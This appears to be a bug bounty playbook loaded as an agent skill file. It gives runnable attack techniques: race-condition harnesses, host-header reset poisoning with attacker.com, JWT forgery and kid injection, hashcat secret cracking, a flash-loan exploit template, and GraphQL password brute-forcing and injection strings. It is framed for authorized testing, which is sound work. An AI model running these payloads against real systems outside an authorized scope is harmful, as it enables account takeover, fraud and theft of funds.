---
name: high-critical-playbook
description: "Unified H/C bug bounty hunting playbook. Covers: pre-scan checklist, business logic attacks, race conditions, password reset security, JWT attacks, Burp Suite active scan strategy, Foundry/DeFi fork testing, auth bypass chains, GraphQL security. Load at scan start for any web2 or DeFi target. Owner: cyber-operator."
trigger_keywords: "high critical playbook, h/c finding, high severity, critical finding, find high bugs, find critical bugs, high bug, serious bug, escalate finding, foundry, race condition harness, concurrent request, token entropy, graphql batching, business logic chain, pre-scan checklist"
version: 1.0
created: 2026-03-01
owner: cyber-operator
tags: [projects, cyber, bug-bounty]
---

# High/Critical Bug Bounty Playbook

> Load this at the START of every session targeting Medium or above.
> This is the unified reference — it replaces ad-hoc scanning.

---

## PRE-SCAN CHECKLIST (MANDATORY — Run Before First Request)

Before any active testing:

```
1. Read your program index         → program status, what's filed, what's pending
2. Read {program}/program-scope.md → vectors already ruled out, Account A/B state
3. Read {program}/finding-*.md     → what's already confirmed (avoid re-testing closed vectors)
4. Check scope rules               → what's OOS (admin paths, third-party, etc.)
5. Check rate limits               → filing cadence (1/18h for most Immunefi programs)
6. Load applicable specialist skill:
   - JWT vectors      → jwt-attack-playbook.md
   - IDOR             → idor-testing-protocol.md
   - SSRF             → ssrf-methodology.md
   - Business logic   → business-logic-framework.md
   - Race conditions  → a technique-reference note
   - Smart contracts  → a technique-reference note
   - GraphQL          → a technique-reference note
```

---

## SEVERITY TARGETING TABLE

| Impact | Severity | Examples |
|--------|----------|---------|
| Read other users' PII | High | IDOR on profile, GraphQL field auth bypass |
| Modify other users' data | High | Unauthorized mutation, parameter tampering |
| Financial loss for users | Critical | Double-spend, price manipulation, flash loan |
| Account takeover | Critical | Password reset token capture, session fixation chain |
| Full admin access | Critical | Privilege escalation, JWT forgery |
| Smart contract fund drain | Critical | Reentrancy, oracle manipulation, access control |

**ROI rule:** Don't file Low findings until all High/Critical vectors are exhausted. A chain of 3 Lows can escalate to a High report — document chains before filing individual pieces.

---

## 1. BUSINESS LOGIC ATTACKS

### State Machine Mapping
Before testing, map all states an object can be in:
```
order: created → paid → shipped → delivered → refunded
account: unverified → verified → suspended → deleted
```
Test: can states be skipped? Reversed? Replayed?

### Trust Boundary Audit
Where does the app trust client data?
- Price / total / subtotal params in intercepted requests
- Quantity fields (test: 0, -1, MAX_INT, float)
- Discount codes (apply multiple times? to ineligible items?)
- Currency codes (swap mid-transaction: USD → IDR)
- Role indicators

### Attack Classes

**Price Manipulation:**
- Modify price/total via Burp Repeater — negative values, zero, fractional cents
- Change currency code mid-transaction
- Apply coupon, modify cart, verify discount persists on new items
- Negative quantity = credit? `quantity: -1`

**Account State Abuse:**
- Complete partial registration flows out of order
- Delete resource → reference by ID in another endpoint
- Modify account type parameter: `role=user → role=admin`
- Abuse trial: create → cancel → re-create same payment/email alias

**Privilege Escalation Chain:**
- Horizontal: change user_id/account_id in API calls
- Vertical: add `role=admin` to profile update or registration
- Context-dependent: accept team invite with modified role parameter
- Chained: low-priv user creates resource → transfers to admin → inherits admin context

**Numeric Abuse:**
- Integer overflow/underflow on quantities, balances
- Floating point precision: `0.000001 × N` accumulating rounding errors
- Negative withdrawal = deposit
- MAX_INT causing balance wrap-around

### Testing Playbook
1. Map every endpoint involved in financial or state-changing operations
2. Document expected workflow sequence with request/response pairs
3. For each step: skip / repeat / reverse / parallel / parameter tamper
4. Every numeric field: test 0, -1, MAX_INT, float precision, type coercion
5. Every reference field (user_id, order_id): IDOR with another account
6. **Chain findings**: Low IDOR + Low state skip = High unauthorized action

---

## 2. RACE CONDITION TESTING

### JavaScript Concurrent Fetch Harness (Browser Console / Node.js)

```javascript
async function raceCondition(url, options, concurrency = 20) {
  const startBarrier = Promise.resolve();
  const results = await Promise.allSettled(
    Array.from({ length: concurrency }, (_, i) =>
      startBarrier.then(() =>
        fetch(url, options).then(async res => ({
          id: i,
          status: res.status,
          body: await res.text()
        }))
      )
    )
  );

  const successes = results.filter(r => r.status === 'fulfilled').map(r => r.value);
  console.log(`[Race] ${successes.length}/${concurrency} succeeded`);
  console.log(`[Race] Unique statuses: ${[...new Set(successes.map(s => s.status))]}`);
  return successes;
}

// Usage:
raceCondition('https://target.com/api/redeem-coupon', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer TOKEN' },
  body: JSON.stringify({ code: 'SAVE50' })
}, 25);
```

### Burp Turbo Intruder — HTTP/2 Single-Packet Attack

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=30,
                           pipeline=False)
    for i in range(30):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')  # All 30 fire simultaneously

def handleResponse(req, interesting):
    table.add(req)
```

### Targets for Race Testing
- Coupon/discount code redemption
- Referral bonus claims
- OTP / 2FA code validation
- API key generation with limits
- Gift card usage
- Vote / like limits
- Wallet withdrawal with balance check

### Detection Indicators
- Multiple 200 OK where only 1 should succeed
- DB shows duplicate rows with <10ms timestamp difference
- Balance decremented N times instead of once

---

## 3. PASSWORD RESET SECURITY

### Host Header Injection

```
POST /api/reset-password HTTP/1.1
Host: attacker-controlled.com          ← inject here
X-Forwarded-Host: attacker.com         ← alternative
Content-Type: application/json

{"email": "victim@target.com"}
```

**Test variants:**
1. `Host: attacker.com` (direct)
2. `X-Forwarded-Host: attacker.com`
3. `Host: target.com\r\nX-Forwarded-Host: attacker.com` (header injection)
4. `Host: target.com@attacker.com`
5. `Host: target.com%00attacker.com`

**Check:** Does the reset email URL contain the injected domain?

**Applicable to:** `hub_sendResetPasswordMail`, `/api/forgot-password`, `/password/reset`

### Token Entropy Analysis

```python
import math, requests

tokens = []
for _ in range(50):
    resp = requests.post('https://target.com/api/reset-password',
                         json={'email': 'test@attacker.com'})
    tokens.append(extract_token_from_email())

charset = set(''.join(tokens))
token_len = len(tokens[0])
max_entropy = math.log2(len(charset)) * token_len
print(f"Charset: {len(charset)} chars | Length: {token_len} | Max entropy: {max_entropy:.1f} bits")

# Look for sequential patterns (timestamp-based tokens share prefixes)
sorted_tokens = sorted(tokens)
for i in range(len(sorted_tokens) - 1):
    common = sum(1 for a, b in zip(sorted_tokens[i], sorted_tokens[i+1]) if a == b)
    if common > len(sorted_tokens[i]) * 0.5:
        print(f"WARNING: High common prefix ({common} chars) — possible predictable token")
```

**Red flags:** < 80 bits entropy, sequential incrementing, timestamp embedded in token

### Token Lifecycle Tests
- Reuse after use: is the token invalidated post-reset?
- Multiple tokens: does requesting token #2 invalidate token #1?
- Expiration: TTL < 30 minutes expected
- Cross-account: does token work on a different account's reset endpoint?

---

## 4. JWT SECURITY

### Recon
```bash
# Decode without verification
echo 'TOKEN' | cut -d'.' -f1-2 | tr '-_' '+/' | base64 -d 2>/dev/null
```
Check: `alg`, `kid`, `sub`, `role`, `exp`, `iss`

### Algorithm Confusion (RS256 → HS256)

```python
import jwt

public_key = open('public_key.pem').read()
payload = {"sub": "admin", "role": "administrator", "exp": 9999999999}
token = jwt.encode(payload, public_key, algorithm='HS256')
print(token)
```

Public key typically at: `/.well-known/jwks.json` or `/certs`

### `alg: none` Bypass
```python
import base64, json

header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"sub": "admin", "role": "admin"}).encode()).rstrip(b'=')
token = f"{header.decode()}.{payload.decode()}."
```

### Weak Secret Crack
```bash
hashcat -m 16500 jwt.txt wordlist.txt --force
python3 jwt_tool.py TOKEN -C -d rockyou.txt
```

### Claim Tampering Checklist
- Change `sub` to another user's ID
- Change `role`/`groups` to `admin`
- Set `exp` to 9999999999
- Remove `exp` entirely
- `"kid": "../../dev/null"` — forces empty key → sign with empty string
- `"kid": "1' UNION SELECT 'attacker-secret' -- "` — SQLi in kid

**Full playbook:** `jwt-attack-playbook.md`

---

## 5. BURP SUITE — H/C ACTIVE SCAN STRATEGY

### Scope Setup
```
Target → Scope → Include: *.target.com
Exclude: *.google.com, logout endpoints, account deletion, /admin/delete-everything
```

### Phase 1: Manual Crawl (Day 1)
- Browse EVERY feature with Burp proxying
- Submit all forms, complete all multi-step workflows
- Review Site Map for endpoint coverage
- Right-click interesting endpoints → "Add to active scan"

### Phase 2: Targeted Scan (NOT "scan everything")
- Select endpoints with user-controlled input
- Scan with specific insertion points (Burp right-click → Scan with insertion points)
- Focus: search fields, file paths, SQL-touching params, redirect params, header-reflected params

### Phase 3: Essential Extensions for H/C
- **Param Miner** — hidden parameters, cache-poisoning vectors
- **Backslash Powered Scanner** — SSTI, blind injection via differential analysis
- **Active Scan++** — host header injection, SMTP injection, cache poisoning
- **Turbo Intruder** — race conditions
- **Collaborator Everywhere** — blind SSRF, blind XSS (OOB via all params)

### Vulnerability Classes Burp Catches That Manual Testing Misses
- HTTP Parameter Pollution: `?user=admin&user=attacker`
- Header Injection: `X-Forwarded-For`, `X-Original-URL`, `X-Rewrite-URL`
- SSTI: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` in every reflectable param
- Cache Poisoning: unkeyed headers reflecting in cached responses
- Blind SSRF: webhook URLs, image import URLs, PDF generation URLs

---

## 6. FOUNDRY/HARDHAT — DEFI FORK TESTING

### Setup
```bash
# Install Foundry
curl -L https://foundry.paradigm.xyz | bash && foundryup

# Fork mainnet
anvil --fork-url https://eth-mainnet.g.alchemy.com/v2/KEY \
      --fork-block-number 19000000
```

### Flash Loan Attack Template

```solidity
function testFlashLoanAttack() public {
    // 1. Take flash loan
    aavePool.flashLoan(address(this), daiAddress, 1_000_000e18, "");
}

function executeOperation(address asset, uint256 amount, uint256 premium,
    address initiator, bytes calldata params) external returns (bool) {
    // 2. Dump borrowed tokens → crash spot price
    IERC20(asset).approve(address(uniRouter), amount);
    uniRouter.swapExactTokensForTokens(amount, 0, path, address(this), block.timestamp);
    // 3. Exploit protocol at manipulated price
    vulnerableProtocol.liquidate(victimPosition);
    // 4. Buy back to restore price
    // 5. Repay loan
    IERC20(asset).approve(address(aavePool), amount + premium);
    return true;
}
```

### Reentrancy PoC Template

```solidity
function testReentrancy() public {
    Attacker attacker = new Attacker(address(vulnerableContract));
    deal(address(token), address(attacker), 1 ether);
    attacker.attack();
    assertGt(token.balanceOf(address(attacker)), 1 ether);
}
```

### Invariant Fuzzing

```solidity
function invariant_poolSolvency() public {
    assertGe(
        pool.totalCollateralValue(),
        pool.totalDebtValue()
    );
}
```

```toml
# foundry.toml
[invariant]
runs = 10000
depth = 50
fail_on_revert = false
```

### DeFi Attack Checklist
1. Fork correct chain at recent block
2. Import deployed contract addresses
3. Write PoC starting with `deal()` to fund attacker
4. Assert extracted value: `assertGt(token.balanceOf(attacker), startBalance)`
5. Include gas estimation + feasibility analysis in report

**Attack taxonomy:**
- Flash loan → price manipulation → protocol interaction
- Reentrancy: ERC-777 callbacks, ERC-1155 `onReceived`, fallback on ETH transfer
- Access control: missing `onlyOwner`, unprotected `initialize()`, missing `msg.sender` check
- Oracle: check `updatedAt` staleness, Chainlink sequencer check missing
- First depositor attack: deposit 1 wei → donate → inflate share price → subsequent depositors get 0

**Full reference:** `l2-bridge-security.md` | `a technique-reference note`

---

## 7. AUTH BYPASS CHAIN METHODOLOGY

### Forced Browsing
```
/admin                    /api/admin/users
/internal/debug           /actuator (Spring Boot)
/debug/pprof (Go)         /.env
/api/swagger.json         /_config
```

**Method:**
1. Crawl as low-priv user → record endpoints
2. Crawl as high-priv user → record endpoints
3. Diff → delta = admin-only surface
4. Access admin endpoints with low-priv token
5. Access admin endpoints with NO token

### Parameter Tampering

```
# Horizontal
GET /api/users/1001/profile → change to /api/users/1002/profile

# Vertical
POST /api/register {"role": "user"} → change to {"role": "admin"}
PUT /api/profile {"name": "x"} → add {"name": "x", "is_admin": true}
```

### Mass Assignment Discovery
- Check API responses, JS source, GraphQL schema for undocumented fields
- Target: `role`, `admin`, `verified`, `approved`, `permissions`, `group_id`, `organization_id`
- Try adding these to any PUT/POST/PATCH body

### Chain Attack Documentation Format
```
Step 1: [Type] — [Evidence]
Step 2: [Type] — [Evidence]
Step 3: [Type] — [Evidence]
Impact: [What the attacker achieves]
CVSS: Calculate on FINAL impact, not individual steps
```

**Example:** Info Disclosure (user IDs exposed) → IDOR (profile read) → Param Tampering (role write) = **Critical** privilege escalation

---

## 8. GRAPHQL SECURITY

### Introspection Query
```graphql
{ __schema { types { name fields { name type { name kind } args { name type { name } } } } } }
```
If blocked, try: GET `/graphql?query={__schema{types{name}}}` or `/graphiql`, `/playground`, `/altair`

### Batching — Rate Limit Bypass

```json
[
  {"query": "mutation { login(email: \"victim@t.com\", password: \"pass1\") { token } }"},
  {"query": "mutation { login(email: \"victim@t.com\", password: \"pass2\") { token } }"}
]
```

**Alias variant (bypasses WAFs that block array batching):**
```graphql
query {
  a1: login(email: "victim@t.com", password: "pass1") { token }
  a2: login(email: "victim@t.com", password: "pass2") { token }
  a3: login(email: "victim@t.com", password: "pass3") { token }
}
```

### Field-Level Authorization Bypass
```graphql
query {
  user(id: "me") {
    name
    email
    ssn                # not in UI but maybe accessible
    internalNotes
    role
    apiKeys { key secret }
    organization {
      users { email role apiKeys { key } }  # cross-object traversal
      billingInfo { cardNumber }
    }
  }
}
```

### Mutations to Test
- Create user with elevated role
- Modify another user's data (IDOR via mutation)
- Delete resources belonging to other users
- File upload mutations: SSRF, path traversal, unrestricted type

### GraphQL Injection
```graphql
# NoSQL injection
query { user(filter: "{\"email\": {\"$regex\": \".*\"}}") { name email } }

# SQL injection
query { user(id: "1' OR '1'='1") { name } }
```

**Target programs:** Coinbase, an example program — map all GQL endpoints, extract schema via InQL, test all mutations for auth bypass + IDOR.

**Full reference:** `a technique-reference note`

---

## TOOL QUICK REFERENCE

| Tool | Purpose |
|------|---------|
| Burp Suite Pro | Proxy, active scanning, Turbo Intruder |
| InQL (Burp) | GraphQL schema extraction + query generation |
| jwt_tool | JWT manipulation + brute force |
| hashcat -m 16500 | JWT secret cracking (GPU) |
| Foundry (forge/anvil) | Solidity fork testing + fuzzing |
| Param Miner | Hidden parameter discovery |
| Collaborator Everywhere | Blind SSRF/XSS via all params |
| Browser console harness | Race condition testing (Section 2 above) |

---

## REPORT TEMPLATE (H/C)

```
## Title: [Vulnerability Type] in [Feature] allows [Impact]

### Severity: Critical / High

### Description
[What is the vulnerability and where does it exist?]

### Steps to Reproduce
1. [Exact step with screenshot/code]
2. [Exact step]
3. [Exact step]

### Proof of Concept
[Code, screenshots, or video — REQUIRED for all severities]

### Impact
[What can an attacker achieve? Quantify financial impact if applicable.]
[If chain: describe full chain steps, calculate CVSS on final impact]

### Remediation
[Specific fix recommendation]
```

---

*Playbook v1.0 | Created 2026-03-01 | Owner: cyber-operator | Authorized testing only*
